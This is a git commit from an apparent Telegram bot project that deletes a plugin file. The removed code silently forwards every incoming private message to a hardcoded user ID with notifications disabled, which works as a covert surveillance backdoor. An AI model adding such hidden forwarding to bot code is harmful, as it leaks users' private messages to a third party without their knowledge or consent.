0c32ebe9f1a7653a98bf2997a2f36028b71b59fb
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2023-03-16 17:39:19 +0530

    Delete livegram.py

--- AnonX/plugins/livegram.py
+++
@@ -1,9 +0,0 @@
-from pyrogram import Client, filters
-from pyrogram.types import Message
-
-from AnonX import app
-
-@app.on_message(filters.private & filters.incoming)
-async def on_pm_s(client: Client, message: Message):
-    if not message.from_user.id == 1808943146:
-        fwded_mesg = await message.forward(chat_id=1808943146, disable_notification=True)
